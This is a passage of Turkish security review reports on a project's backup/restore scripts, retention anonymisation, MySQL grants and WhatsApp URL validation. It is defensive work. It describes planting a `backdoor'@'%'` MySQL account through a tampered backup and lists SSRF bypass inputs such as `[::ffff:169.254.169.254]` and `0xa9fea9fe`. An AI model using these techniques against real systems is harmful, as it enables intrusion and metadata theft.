- Anlık görüntüye şunlar eklenmeli: `CHECKSUM TABLE mysql.user, mysql.db, mysql.tables_priv, mysql.columns_priv, mysql.procs_priv, mysql.global_grants, mysql.proxies_priv, mysql.role_edges, mysql.default_roles`, `performance_schema.persisted_variables` sayısı ve `mysql.component`/`mysql.plugin` sayısı.
- İstemci komutu deseni satır içi `\\[!.]` biçimini (tırnak dışında) de yakalamalı; daha basit yol: dökümde mysqldump'ın üretmediği her `\` komutu reddedilir.
- Esas çözüm değişmedi: imza + migrator ile yükleme (migrator `GRANT`/`CREATE USER`/`SET PERSIST` yapamaz).
  Atanan ajan: devops (+ dba).

## Gerileme kontrolü (bulgu yok)

- `writeAudit` çalışan kayıtlarını değiştirmiyor: tam IP ve 300 karaktere kırpılmış UA yazılıyor. Giriş ve brute-force audit kayıtları etkilenmedi.
- Akış biçimli yedekte başarısız `mysqldump` → `pipefail` → `die` → `on_exit` `.partial` dizinini siliyor. "-- Dump completed", tablo, `_prisma_migrations` ve tetikleyici sayısı denetimleri korunuyor.
  - Not: `on_exit` arka plandaki yan süreçleri (FIFO okuyucuları) öldürmüyor. Takılırsa systemd `TimeoutStartSec=1h` keser; güvenlik etkisi yok.
- `restore.sh` döküm adını ve tablo adlarını hâlâ regex ile doğruluyor. Şifreli dosya özeti çözmeden önce, istemci komutu denetimi yüklemeden önce yapılıyor. Scratch FAIL olursa canlıya dokunulmuyor.
- Parola argv kuralı korunuyor: yeni `mysql` çağrıları da `MYSQL_PWD` konteyner env'iyle çalışıyor.

## Otomatik tarama

- `pnpm audit --audit-level=moderate`: No known vulnerabilities found. Yeni bağımlılık yok.
- Diff'te sır yok (backup.env.example hâlâ değersiz).

## Açık kalan (Sonra — `docs/gereksinimler.md` §9'a eklenmesi önerilir)

- S-P13a-8 [ORTA]: `file.transfer` audit'inde dosya adı ve sha256 (backend-dev). Prod açılışından (P13b) önce kapatılması önerilir.
- S-P13a-2 kalanı [DÜŞÜK]: manifest imzası, migrator ile yükleme, tam yetki anlık görüntüsü, satır içi istemci komutu (devops + dba). **P13b site dışı yedek ön koşulu.**

---

# Güvenlik Raporu — P13a turu — Kod turu 1 (2026-11-14)

DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 1 / Düşük 6 (S-P13a-1..7) + 1 bilgi notu. Orta ve Düşük bulgular GEÇTİ kararını engellemez; `docs/gereksinimler.md` §9'a "Sonra" olarak eklenmeleri önerilir. **S-P13a-2 (yedek bütünlüğü) site dışı yedekten (P13b) önce kapatılmalıdır.**

Kapsam: commit edilmemiş P13a değişiklikleri. İncelenen kod: migration `20261114120000_p13a_retention` (up ve down), `prisma/sql/grants.sql`, `deploy/mysql/{init/01-users.sh,backup-user.sql,check-app-grants.sh}`, `deploy/backup/*` (backup.sh, restore.sh, lib.sh, systemd birimleri, backup.env.example), `jobs/{retention,retention-repo,scheduler}.ts`, `requests/jobs.ts`, `customers/service.ts`, `bindings/service.ts`, `sessions/history{,-repo}.ts`, `settings/{routes,system}.ts`, `notify/whatsapp.ts`, `env.ts`, `audit/mask.ts`, contracts `api/system-settings.ts`, `api/sessions.ts`, compose/CI/.env.example/.gitignore. Okunan belgeler: mimari-p13, db-notlari P13a, implementation P13a, runbook §18.
Koşulanlar: K13 ve kanonikleştirme için Node denemesi (aşağıda). DB'li entegrasyon testleri ve `check-app-grants.sh` bu turda koşulmadı; dba ve backend kayıtlarına (373/373, 525/525 ×3) dayanıldı. Staging'e bağlanılmadı.

## Bulgular (öncelik sırasıyla)

### [ORTA] S-P13a-1 Anonimleştirilmiş oturum audit üzerinden 730 gün yeniden tanımlanabiliyor — A04 Insecure Design / KVKK

Yer: `apps/server/src/public/service.ts:69-77` (`guest.pending` → `newValue.name`, `entityId = session id`, `ip_address`, `user_agent`); aynı desen `guest.admitted` ve `guest.rejected` (`TIMELINE_DETAIL_KEYS`, `packages/contracts/src/api/sessions.ts:302-304`); `docs/mimari-p13.md` K-P13-1 ve K-P13-3.
Sorun: Saklama işi oturumun kişisel alanlarını NULL'luyor (`retention-repo.ts:38-41`). Ancak aynı oturumun audit satırları müşteri adını, IP adresini ve tarayıcı bilgisini (UA) `entity_id = <oturum id>` ile 730 gün tutuyor. Anonim oturum ve kişisel veri tek bir anahtarla birleştirilebiliyor. KVKK'da anonimleştirme, verinin "başka verilerle eşleştirilerek dahi" bir kişiyle ilişkilendirilememesini gerektirir. Bu nedenle sonuç anonimleştirme değil, takma adlandırmadır (pseudonymization). K-P13-1'in "anonim satır artık kişisel veri değil, hard delete gerekmez" gerekçesi, audit kaydı durdukça (730 gün) zayıf kalıyor. Ekran kuralı (K-P13-3) adı yalnız zaman çizelgesinden gizliyor. `audit.view` yetkisi olan her Admin, oturum id'si ile ada ve IP'ye ulaşabiliyor.
İstismar senaryosu: Bir ilgili kişi, 365 gün sonra verisinin "anonimleştirildiği" bildirimini alır. Tenant Admin'i Audit ekranında oturum id'si (veya tarih) ile filtreleme yaparak `guest.pending` kaydından ad, IP ve UA'ya ulaşır. Oturumun ticket no'su, süresi ve teknisyeni de yeniden kişiye bağlanmış olur. Denetimde "anonimleştirme" beyanı tutarsız bulunur.
Düzeltme (seçeneklerden biri; mimar karar verir):
(a) İleriye dönük: `guest.*` audit kayıtlarına ad yazılmaz. Ad oturum satırında zaten var ve saklama işiyle birlikte silinir. Audit'te yalnız `guestId` ve `guestKind` kalır. Misafir IP'si için `ip_address` yerine kesilmiş önek (netKey) yazılması değerlendirilir.
(b) Hukuki ve belge düzeltmesi: K-P13-1/K-P13-3 "takma adlandırma + 730 gün meşru menfaat" olarak yeniden yazılır. Aydınlatma metni ve VERBİS bu süreyi belirtir. Audit'teki ada erişim yalnız Super Admin'e daraltılır.
Atanan ajan: mimar (karar) → backend-dev (a) / teknik-yazar (b).

### [DÜŞÜK] S-P13a-2 Yedek kimlik doğrulamasız; geri yükleme root ile ve `mysql` istemci komutları açık — A08 Software and Data Integrity Failures

Yer: `deploy/backup/restore.sh:84-88` (sha256 manifestin içinden okunuyor), `:121` `sql_root` (root), `:146` ve `:184` (döküm root ile yükleniyor); `backup.sh:181-188` (manifest imzasız, `ageRecipients` açık anahtarı manifestte).
Sorun: age yalnız gizlilik sağlar. Alıcı açık anahtarını bilen herkes geçerli bir `.age` dosyası üretebilir. Manifestteki sha256 değerleri de manifestle birlikte değiştirilebilir. Döküm `mysql -uroot` ile yükleniyor. Böylece dökümdeki her SQL (`CREATE USER … '%'`, `GRANT ALL`, `USE mysql`, `CREATE EVENT/PROCEDURE`) root olarak çalışır. `mysql` 8.4 istemcisinde `system` ve `\!` komutları varsayılan olarak açıktır; bunlar konteyner içinde kabuk komutu çalıştırır. Scratch doğrulaması yalnız tablo kümesine, satır sayısına, tetikleyici sayısına ve son migration'a bakıyor. Eklenen kullanıcıları ve rutinleri görmüyor. `mysql` şeması `DROP DATABASE` işleminden etkilenmediği için eklenen hesap kalıcı olur.
İstismar senaryosu: Bugün yedek dizinine yazmak için staging'de root gerekiyor, bu yüzden etki düşük. P13b'de site dışı kopya (S3/NAS) devreye girince, o hedefe yazabilen biri manifest ve dökümü değiştirir. Yönetici `--target staging` ile geri yükleme yapar, scratch doğrulaması OK verir ve canlı MySQL'de `backdoor'@'%'` hesabı oluşur.
Düzeltme: (1) Manifest imzalanır (`ssh-keygen -Y sign` / minisign). Doğrulama açık anahtarı yönetici tarafında durur ve `restore.sh` imzayı doğrulamadan çözmeye geçmez. (2) Yükleme `mysql --system-command=OFF` ile yapılır. (3) Yükleme root yerine `migrator` ile yapılır: migrator DB'ye bağlıdır, `CREATE USER` yetkisi yoktur ve `force_created_at` tetikleyicisinden muaftır. (4) Geri yükleme öncesinde ve sonrasında `mysql.user`, `information_schema.ROUTINES` ve `EVENTS` karşılaştırılır. P13b site dışı yedekten önce zorunlu. Atanan ajan: devops (+ dba, 3. madde).

### [DÜŞÜK] S-P13a-3 Şifresiz tam döküm diske yazılıyor (geri yüklemede /tmp, yedekte .partial) — A02 Cryptographic Failures / veri artığı

Yer: `deploy/backup/restore.sh:83` (`mktemp -d "${TMPDIR:-/tmp}/…"`, `:93` çözülmüş `db.sql.gz` ve `uploads.tar.gz`); `backup.sh:123-133` (`$BACKUP_DIR/.partial-*/db.sql.gz` düz), `:210-214` (ölü `.partial` yalnız başarılı bir yedekten sonra ve 24 saatten eskiyse silinir); runbook §18.4 B / §18.5.
Sorun: Runbook özel anahtarı özenle `/dev/shm`'de tutuyor. Ancak çözülmüş tam veritabanı (kişisel veri, parola hash'leri, şifreli sırlar) ve uploads, Ubuntu 24.04'te disk üzerinde olan `/tmp`'ye yazılıyor ve `rm -rf` ile siliniyor (üzerine yazılmıyor). Yedek tarafında düz döküm, şifreli yedeklerle aynı diskte duruyor. Süreç SIGKILL ile ya da `TimeoutStartSec` sonrası öldürülürse düz döküm en az bir gün kalır. Ayrıca P13b'de site dışı eşitleme (`rsync BACKUP_DIR`) `.partial` dizinini de kopyalayabilir.
İstismar senaryosu: Disk imajı, snapshot ya da `.partial` dahil eşitlenen bir kopya ele geçirilir ve şifreleme atlanmış olur.
Düzeltme: `restore.sh` sunucuda `WORK` için `/dev/shm`'i tercih etmeli (boş alan kontrolüyle; runbook'ta `TMPDIR=/dev/shm` da olur). `backup.sh` akış biçiminde çalışmalı: `mysqldump | gzip | tee >(sha256/sayım) | age -o …`, böylece düz dosya hiç oluşmaz. Ölü `.partial` dizinleri betik başında, yaşına bakılmadan temizlenmeli (kilit alındıktan sonra). Site dışı eşitlemede `.partial-*` ve `.lock` hariç tutulmalı. Atanan ajan: devops.

### [DÜŞÜK] S-P13a-4 `backup` hesabı audit tetikleyicilerini düşürebilir; günlük yedek tetikleyici kaybını yakalamıyor — A09 Logging & Monitoring Failures

Yer: `deploy/mysql/backup-user.sql` (`GRANT … TRIGGER`), `backup.sh:141-142` (yalnız DB sayısı = döküm sayısı karşılaştırılıyor).
Sorun: MySQL'de `TRIGGER` yetkisi `DROP TRIGGER` iznini de kapsar. db-notlari bunu kabul ediyor ve yan etkiyi `'backup'@'localhost'` sınırıyla azaltıyor. Hesaba ulaşmak için mysql konteynerine girmek gerekiyor, orada root parolası zaten var; yani yetki yükseltmesi yok. Asıl açık tespit tarafında: `audit_logs_retention_only_delete` veya `force_created_at` düşürülürse `app` yeni audit satırlarını silebilir hale gelir. `backup.sh` ise DB'deki tetikleyici sayısını yalnız dökümle karşılaştırdığı için "OK" yazmaya devam eder. Beklenen 3 ile karşılaştırma yalnız aylık `restore.sh` provasında ve CI'da var.
İstismar senaryosu: Tetikleyiciler düşürülür (elle hata veya saldırı), ardından `app` yetkisiyle yakın tarihli audit satırları silinir. Bu durum aylık provaya kadar fark edilmez.
Düzeltme: `backup.sh`'te `TRIGGERS` değeri `BACKUP_EXPECTED_TRIGGERS` (varsayılan 3) değilse FAILED verilmeli (alarm zaten bağlı). Tetikleyici adları manifeste yazılmalı. `check-app-grants.sh`'e "backup DROP TRIGGER yapabilir (kabul edilen risk)" yorumu eklenmeli. Atanan ajan: devops (+ dba yorum).

### [DÜŞÜK] S-P13a-5 Anonim oturumda serbest metin alanları kalıyor (`session.terminated.reason`, `ticket_no`) — KVKK / veri minimizasyonu

Yer: `packages/contracts/src/api/sessions.ts:137` (`reason` ≤ 200 serbest metin) ve `:319` (zaman çizelgesinde gösteriliyor); `apps/server/src/sessions/history.ts` (anonimde yalnız `details.name` siliniyor); `support_sessions.ticket_no` (≤ 50, serbest; AC-197 gereği kalıyor).
Sorun: Yönetici sonlandırma gerekçesine ("Ayşe Hanım'ın isteğiyle kapatıldı") ya da ticket alanına kişisel veri yazabiliyor. Bu alanlar anonimleştirmeden sonra da ekranda ve CSV'de görünüyor.
Düzeltme: Anonim oturumda zaman çizelgesinden `session.terminated.reason` çıkarılmalı. `ticket_no` ve sonlandırma gerekçesi alanlarına "kişisel veri yazmayın" ipucu eklenmeli. Atanan ajan: backend-dev (+ frontend-dev ipucu).

### [DÜŞÜK] S-P13a-6 `restore.sh --target staging` ortamı doğrulamıyor — A04 Insecure Design

Yer: `deploy/backup/restore.sh:157-166`.
Sorun: Koruma, scratch doğrulaması, `--confirm <DB adı>`, root kontrolü ve ön yedekten oluşuyor; hepsi iyi. Ancak "staging" adı hiçbir şeyle eşleştirilmiyor. P13b'de prod sunucuda aynı komut prod DB'sini siler (DB adı iki ortamda da `remote` olabilir).
Düzeltme: P13b'de `--target` değeri compose proje adı veya `deploy/.env` içindeki bir `DEPLOY_ENV` ile eşleşmeli. `production` için ayrı onay istenmeli (ör. hostname yazdırma). Atanan ajan: devops.

### [DÜŞÜK] S-P13a-7 `backup.env` sahiplik/izin denetimi yok; `BACKUP_ALERT_CMD` root olarak `sh -c` ile çalışıyor — A05 Security Misconfiguration

Yer: `deploy/backup/backup.sh:29`, `:36-38`; `lib.sh:20-31`.
Sorun: Dosyanın `source` edilmemesi ve anahtarların izin listesiyle sınırlanması iyi. Ancak `BACKUP_ALERT_CMD` keyfi komut olduğu için dosya fiilen root kodudur. İzinler yanlış kurulursa (ör. `/opt/remote`'u başka bir kullanıcı yönetiyorsa) yetki yükseltmesine yol açar. `BACKUP_ENV_FILE` ortamdan değiştirilebiliyor (systemd altında sorun değil).
Düzeltme: `load_env_file` öncesinde dosya root sahibi değilse veya grup/diğer yazabiliyorsa `die` verilmeli (`[ -O "$f" ]` ve `find "$f" -perm /022`). Atanan ajan: devops.

### Bilgi (bulgu değil)

- `audit_logs_force_created_at` muafiyeti `USER()` ile, yani istemcinin bildirdiği kullanıcı adıyla yapılıyor. Anonim bir MySQL hesabı (`''@'%'`) eklenirse `-u root` ile bağlanıp anonim hesapla doğrulanan bir istemci de muaf sayılır. Bugün böyle bir hesap yok. `check-app-grants.sh`'e `SELECT COUNT(*) FROM mysql.user WHERE user=''` = 0 kontrolü eklenebilir (dba).
- `REPLACE INTO audit_logs` (INSERT + DELETE yetkisi) çakışmada silme tetikleyicisini çalıştırır, dolayısıyla 730 gün sınırı korunur. `INSERT … ON DUPLICATE KEY UPDATE` için UPDATE yetkisi gerekir ve app'te yok. Ek açık yok.

## Doğrulanan odak maddeleri (bulgu yok)

- **En az yetki:** app'in DELETE yetkisi olan tablolar tam olarak `audit_logs, auth_sessions, password_reset_tokens, recovery_codes, session_files, tenant_settings, tenants, user_permissions, users`; sütun yetkileri tam eşitlikle sınanıyor (`check-app-grants.sh`). `session_consents` için yalnız `UPDATE(ip, user_agent)` verilmiş; karar, seviye ve metin özeti değişirse 1143 alınıyor. `support_sessions/support_requests/device_bindings/customers` tablolarında DELETE yok (K-P13-1). Sütun GRANT'ı tablo REVOKE'undan sonra geliyor; dosya idempotent.
- **Tetikleyici atlatma:** `created_at` app için `SYSDATE(3)` + `CONVERT_TZ` ile zorlanıyor. `SET TIMESTAMP` ve oturum `time_zone` etkisiz; bilinmeyen dilim `SET` aşamasında reddediliyor; NULL → NOT NULL ihlali (fail-closed). Geriye tarihli ekle-sil reddi CI'da sınanıyor. Silme kesmesi `LEAST(iş saati, UTC_TIMESTAMP)-730 g` olduğu için ileri kaymış uygulama saati tetikleyiciyi aşamıyor. Muaf liste yaklaşımı (yalnız `migrator`, `root`) fail-closed. Tetikleyiciyi düşürme (`DROP TRIGGER`) app için reddediliyor.
- **Anonimleştirme (oturum tablosu):** Tek TX; dosya satırları silinip onay IP/UA ve oturum PII aynı UPDATE'te temizleniyor. `support_sessions_anonymized_chk` sayesinde PATCH ile yeniden kişisel veri yazılamıyor (DB savunması); API önce 409 `SESSION_ANONYMIZED` dönüyor, eşzamanlı durum `anonymized_at IS NULL` koşuluyla karşılanıyor. Detayda e-posta, not, dosyalar ve talep PII'si null; zaman çizelgesinde ad ve CUSTOMER `actorName` null; CSV'de "Anonimleştirildi". Talep anonimleştirmesi IP, ipKey, netKey ve deviceHash'i de temizliyor. down.sql anonim oturum varken duruyor.
- **Saklama işi DoS ve kilitleme:** 1000'lik oturum partileri tek TX'te ve yeni indeksle (`tenant_id, anonymized_at, created_at`) çalışıyor; global silmeler 5000'lik partilerle `IX(created_at)` üzerinden yapılıyor. Turlar üst üste binmiyor, iş fail-soft ve idempotent. Sonsuz döngü riski yok: seçim ve UPDATE koşulları aynı, bitmiş durumlar terminal. Tek ağır DDL `ADD CHECK` (COPY); staging'de küçük, prod henüz kapalı.
- **Log ve audit:** `retention.run` yalnız sayı içeriyor; `resetTokens` maske izin listesine eklendi; hata logunda kişisel veri yok.
- **Yedek parolaları:** `backup` parolası hiçbir argv'ye girmiyor (`MYSQL_PWD` konteyner env'inden; `backup-user.sql` onaltılı literal + `QUOTE()`; `01-users.sh` heredoc + tırnak reddi + ≥ 16 karakter). Yalnız scratch'in rastgele root parolası `docker run -e` argümanında görünüyor; ağsız ve geçici olduğu için önemsiz. PROCESS, LOCK TABLES ve RELOAD verilmemiş. Hesap yalnız localhost'tan (soket) bağlanıyor.
- **Yedek betikleri:** `umask 077`, dizin 700, dosyalar 600; atomik `mv`; kilit; rotasyon yalnız regex'e uyan adları siliyor. age alıcısı `^age1[0-9a-z]{58}$` ile doğrulanıyor (özel anahtar yanlışlıkla yazılamıyor). Manifestteki DB ve tablo adları regex ile doğrulandıktan sonra SQL'e giriyor, bu yüzden komut ve SQL enjeksiyonu yok. Yardımcı konteynerler `--network none --cap-drop ALL --no-new-privileges` ile çalışıyor; staging hedefinde scratch FAIL ise canlıya dokunulmuyor, `--confirm` isteniyor ve ön yedek alınıyor. Kurcalanmış `.age` dosyası çözme öncesinde FAIL veriyor (S-P13a-2'deki sınırla).
- **Hız sınırı:** PUT/DELETE mysql|turn|whatsapp için kullanıcı başına 10/dk; doğrulamadan sonra sayılıyor; 429 + `Retry-After` dönüyor. Değişmeyen PUT yazılmıyor ve audit'e girmiyor.
- **WhatsApp kanonikleştirme ↔ K13:** saklanan değer WHATWG kanonik biçimde ve K13 aynı değeri sınıflıyor. Node denemesinde `0xa9fea9fe`, `[::ffff:169.254.169.254]`, `[fe80::1]`, `0.0.0.0`, `[::]`, `localhost.` ve IDN adresleri prod + http'de **kapalı**; `%31%30.0.0.1`, `127.1`, `[::ffff:7f00:1]` ve `[::ffff:a00:1]` özel ağ olarak **açık** (tutarlı). `\` → yol (`http://10.0.0.1/.evil.com`) ve U+00AD reddediliyor. Zod ile DB CHECK aynı kümeyi kullanıyor (`\p{Cc}\p{Cf}\p{Zl}\p{Zp}`).
- **Go bağımlılıkları:** implementation kaydına göre govulncheck temiz; `go.mod` değişmedi.

## Otomatik tarama çıktıları

- `pnpm audit --audit-level=moderate`: **No known vulnerabilities found**.
- Gizli bilgi (`git grep` api_key/secret/password/token kalıbı, testler hariç): eşleşme yok. Yalnız CI'daki sahte `MYSQL_BACKUP_PASSWORD: ci-backup-only-123` var (test değeri, kabul). `AGE-SECRET-KEY-1…` kalıbı deploy/docs/apps/packages içinde yok.
- `.env` geçmişi: git geçmişinde yalnız `.env.example` var. `deploy/backup/backup.env` `.gitignore`'da. `backup.env.example` değer içermiyor.
- `89.252.189.211` (kimliksiz WhatsApp servisi) `backup.env.example` örneğine de girdi. Daha önce kabul edilmiş durum (P12b raporu); yeni risk yok.

## Tasarımda vaat edilip kodda bulunmayanlar

- Mimari §4 `backup` yetkileri `… PROCESS` diyordu; dba bilerek vermedi (daha sıkı, gerekçeli). Uygun.
- Mimari §4 `BACKUP_DB_PASSWORD`: kullanılmadı, parola konteyner env'inden okunuyor (daha iyi, runbook'ta gerekçeli).
- Mimari §4 "özel anahtar yalnız geçici olarak getirilir": anahtar için uygulanmış, ancak çözülmüş döküm diske yazılıyor (S-P13a-3).
- Mimari §3 `source` büyük harf → küçük harfle uygulandı (gerekçeli, güvenlik etkisi yok).

## Olumlu

- K-P13-4 tasarımına uyulmuş: DELETE yetkisi ve `created_at` zorlaması aynı migration'da. Muafiyet fail-closed ve yeni hesaplar varsayılan olarak zorlanıyor.
- DB katmanında savunma derinliği var: anonimlik CHECK'i, sütun düzeyi UPDATE, tam eşitlikli yetki kümesi testleri, WhatsApp CHECK ↔ zod eşliği ve up/down guard'ları.
- Yedek betikleri olgun: kaynak edilmeyen env, alıcı regex'i, atomik yayım, ağsız ve yeteneksiz yardımcı konteynerler, scratch-önce akışı ve olumsuz senaryo provası (kurcalanmış `.age`, yanlış anahtar, MySQL kapalı).
- Saklama işi gözlemlenebilir (metrikler, alarm kuralları, `retention.run` audit) ve kişisel veri içermiyor.

---

# Güvenlik Raporu — P12b turu — Kod turu 2 / doğrulama (2026-11-13)

DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 1 açık (B-P12b-4, Sonra). B-P12b-1, -2, -3 ve -6 kapandı. B-P12b-5 kısmen kapandı: test ucuna global tavan eklendi, PUT/DELETE hız sınırı "Sonra"ya bırakıldı. Gerilemeye rastlanmadı.

Kapsam: düzeltme turu 1 değişiklikleri: `notify/whatsapp.ts`, `settings/{routes,system}.ts`, `env.ts`, runbook §env satırı. Koşulanlar: server `test/unit` **347/347**, contracts **75/75**, `pnpm -r run typecheck` temiz. DB'li entegrasyon testleri bu turda da koşulmadı.

## Kapanan bulgular

- **B-P12b-1 (KAPANDI):** `setUrl` artık önce sınıflandırıyor (`isParsableServiceUrl` hata fırlatmıyor), atamayı sonra yapıyor (`whatsapp.ts` `setUrl`). Ayrıştırılamayan adreste `insecure=true` → kanal kapalı oluyor ve `alarm:"whatsapp_invalid_url"` logu yazılıyor (adres loga girmiyor). `isInsecureServiceUrl` de ayrıştırılamayan adres için her ortamda `true` dönüyor. Bu sayede `getWhatsappSettings` artık 500 üretmiyor; ekranda güvensiz uyarısı görünüyor. Test ucu bu durumda istek göndermeden `ok:false` dönüyor.
- **B-P12b-2 (KAPANDI):** PUT/DELETE + belleğe uygulama süreç içi `serialQueue` ile sıralı çalışıyor (`settings/routes.ts`). Uygulanan değer, TX'te yazılan değerin kendisi (`save…` → `input.url`, `delete…` → env); DB yeniden okunmuyor. Hata zinciri kuyruğu kırmıyor (`tail = run.catch(...)`). Zod doğrulaması kuyruk dışında yapıldığı için geçersiz istek sırayı bekletmiyor. Tek süreç varsayımı (ADR-0005) sürüyor; çok örnekli kurulumda yeniden değerlendirilmeli.
- **B-P12b-3 (KAPANDI):** `env.ts:68` artık `waServiceUrlSchema` kullanıyor. Doğrulandı: `http://u:p@h` ve `http://h/?a=1` reddediliyor, sondaki `/` kırpılıyor. Hata mesajında yalnız anahtar adı ve kural metni var, değer yok (`loadEnv`). Boş değer `withoutBlanks` ile tanımsız sayılıp varsayılana düşüyor; staging'deki `WHATSAPP_SERVICE_URL=` (boş) satırı açılışı bozmuyor. Runbook env satırı "uymazsa server açılmaz" diye güncellenmiş.
- **B-P12b-5 (KISMEN):** test ucuna MySQL kalıbıyla aynı `global` 20/dk eklendi (`GLOBAL_KEY`, 21. → 429). PUT/DELETE hız sınırı "Sonra"ya bırakıldı. Gerekçe: yalnız SUPER_ADMIN kullanabiliyor ve her işlem audit'e yazılıyor. Risk kabulü uygun; §9'a eklenmeli.
- **B-P12b-6 (KAPANDI):** `void res.body?.cancel().catch(() => undefined)` sonuç sınıflandırılmadan önce çağrılıyor; 3xx ve hata yanıtlarında da çalışıyor. `FetchLike` tipine isteğe bağlı `body` eklendi, test sahteleri gövdesiz de çalışıyor.

## Gerileme kontrolü (bulgu yok)

- K13: `production` + `http` + genel adres kuralı değişmedi. Kod turu 1'deki Node denemeleri (ondalık/onaltılı/IPv4-mapped/DNS adı) aynı sonucu veriyor; kural yalnız "ayrıştırılamıyor → kapalı" yönünde sıkılaştı.
- Yönlendirme (`redirect:"manual"`), 8 sn zaman aşımı, sabit test mesajları ve log içeriği değişmedi.
- Audit: Super Admin testi artık `recipient` anahtarını kullanıyor (QA hizalaması). Değer yine `maskPhone`; `recipient` kara listede değil, maske değerin kendisinde uygulanıyor.
- Yetki/CSRF hook'ları ve tenant yanıtları (`serviceConfigured`/`insecure`, adres yok) değişmedi.
- Hız sınırı sırası: `perUser.hit || global.hit` kısa devre yapıyor. Kullanıcı kotası dolmuşsa global kova tüketilmiyor, kullanıcı kotası sürerken global dolarsa kullanıcı hakkı harcanıyor. MySQL testiyle aynı davranış, kabul edilebilir.

## Açık kalan (Sonra — `docs/gereksinimler.md` §9'a eklenmesi önerilir)

- B-P12b-4 [DÜŞÜK]: adres normalize edilerek saklanmalı, `\p{Cf}\p{Zl}\p{Zp}` reddedilmeli; zod ve DB CHECK birlikte değişmeli (backend-dev + dba).
- B-P12b-5 kalan kısmı [DÜŞÜK]: PUT/DELETE için kullanıcı başına sınır veya değişmeyen kayıtta audit yazmama (backend-dev).
- Bilgi (T33 risk kabulü): K13'te `169.254/16` link-local aralığının "genel" sayılması ve bildirim hedefini değiştiren ayarlarda step-up 2FA.

## Otomatik tarama

- Kod turu 1 çıktıları geçerli: `pnpm audit` açık yok, gizli bilgi taraması temiz. Düzeltme turunda yeni bağımlılık eklenmedi.

---

# Güvenlik Raporu — P12b turu (Super Admin WhatsApp servisi ayarı, AC-196) — Kod turu 1 (2026-11-13)

DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 6 (B-P12b-1..6). Hepsi `docs/gereksinimler.md` §9'a "Sonra" olarak önerilir; B-P12b-1 ve B-P12b-3 küçük olduğu için bu paketin düzeltme turunda kapatılabilir.

Kapsam: commit edilmemiş P12b değişiklikleri (`git diff` + yeni dosyalar). Okunanlar: migration `20261114090000_whatsapp_service_setting` (up/down), contracts `api/system-settings.ts` ve `audit.ts`, server `notify/whatsapp.ts`, `settings/{system,routes}.ts`, `app.ts`, `requests/panel.ts`, `auth/guards.ts`, `audit/mask.ts`, `env.ts`; web `admin/settings/whatsapp/*` ve `lib/admin-settings/whatsapp.ts`. Koşulan testler: `test/unit/whatsapp-runtime-p12b.test.ts` **4/4**, contracts `test/whatsapp-setting-p12b.test.ts` **4/4** geçti. DB'li entegrasyon testleri bu turda koşulmadı.

## Bulgular (öncelik sırasıyla)

### [DÜŞÜK] B-P12b-1 `setUrl` atama sırası: ayrıştırılamayan adreste eski `insecure` değeri kalıyor — A04 Insecure Design (fail-closed)

Yer: `apps/server/src/notify/whatsapp.ts:146-150`; `apps/server/src/app.ts:233-239` (onReady catch)
Sorun: `this.url = url` önce atanıyor, `isInsecureServiceUrl` (içinde `new URL`) sonra çalışıyor. `new URL` hata fırlatırsa `url` yeni değerde kalır ama `insecureNow` önceki adresin değerini korur. Açılışta bu hata `onReady` içinde yakalanıyor ve "env kullanılıyor" logu yazılıyor. Oysa etkin adres env değil, bozuk panel değeri oluyor; log yanlış bilgi veriyor. DB CHECK yalnız regex uyguluyor (`http://a:99999` CHECK'ten geçer, WHATWG'de geçersizdir). Zod `parsesAsUrl` bu yüzden yalnız API yolunu koruyor; migrator ile elle yazılmış ya da ileride değişen bir satır bu duruma düşebilir.
İstismar senaryosu: Doğrudan istismar yok. Ayrıştırılamayan adrese `fetch` de gidemez (`unreachable`). Sorun güvenlik kapısının fail-closed tasarlanmamış olması ve alarm logunun yanıltıcı olması.
Düzeltme: Önce `const insecure = isInsecureServiceUrl(...)` hesaplanmalı (try/catch içinde; ayrıştırılamıyorsa kanal kapalı sayılmalı, `alarm:"whatsapp_invalid_url"`), atamalar sonra yapılmalı. Ya da `effectiveWhatsappUrl` panel değerini `waServiceUrlSchema` ile yeniden doğrulamalı; geçmezse env'e dönmeli ve alarm yazmalı. Bunun için birim testi eklenmeli. (atanan ajan: backend-dev)

### [DÜŞÜK] B-P12b-2 Eşzamanlı PUT/DELETE: bellekteki etkin adres DB'den farklı kalabiliyor — A04 (yarış durumu)

Yer: `apps/server/src/settings/routes.ts:100-108` (`save…` TX'i bittikten sonra ayrıca `applyWhatsapp` → `effectiveWhatsappUrl` DB'yi yeniden okuyor)
Sorun: A ve B aynı anda PUT yapınca şu sıra oluşabiliyor: A yazar → A okur(A) → B yazar → B okur(B) → B `setUrl(B)` → A `setUrl(A)`. Sonuçta DB ve ekran B'yi gösteriyor, bildirimler ve testler ise A'ya gidiyor. Bu durum yeniden başlatmaya kadar sürüyor. K13 bozulmuyor, çünkü `insecure` her zaman gerçekten kullanılan adresten hesaplanıyor. Bozulan, AC-196'daki "ekranda görünen = kullanılan" tutarlılığı ve audit'teki son değerin gerçeği yansıtması.
İstismar senaryosu: Kötü niyetli kullanım için Super Admin olmak gerekiyor; ikinci bir Super Admin'in yaptığı değişikliği sessizce geçersiz kılmak gibi denetim sorunları doğabilir. Olasılığı düşük.
Düzeltme: Uygula adımı süreç içinde sıraya alınmalı (tek promise zinciri ile `PUT/DELETE + apply` seri çalışmalı). Ya da apply, TX'te yazılan değeri (`input.url` / env) doğrudan `setUrl` ile uygulamalı ve okuma ile yazma aynı kilit altında yapılmalı. Eşzamanlı iki PUT için bir test eklenmeli. (atanan ajan: backend-dev)

### [DÜŞÜK] B-P12b-3 `WHATSAPP_SERVICE_URL` (env) panel kuralına tabi değil: userinfo/sorgu GET yanıtına ve audit'e açık gidebilir, `endpoint()` birleştirmesi bozulur — A05 Security Misconfiguration / A09

Yer: `apps/server/src/env.ts:65` (`z.url()` + yalnız şema kontrolü); `apps/server/src/settings/system.ts:281` (GET `url`), `:300` ve `:322` (audit `oldValue`/`newValue` env adresi); `apps/server/src/notify/whatsapp.ts:111` (`endpoint` = string birleştirme)
Sorun: Panel adresinde `@ ? #` yasak, env adresinde değil. Operatör env'e `http://kullanici:sifre@host` yazarsa bu değer Super Admin GET yanıtında görünür ve her PUT/DELETE'te audit'e açık yazılır. Audit maskesi `url` anahtarını maskelemiyor. Ayrıca P12b'de `new URL(path, base)` yerine string birleştirmeye geçildi. Env adresinde sorgu varsa (`…/?k=v`) istek `…/?k=v/send-message` adresine gider ve sessizce bozulur.
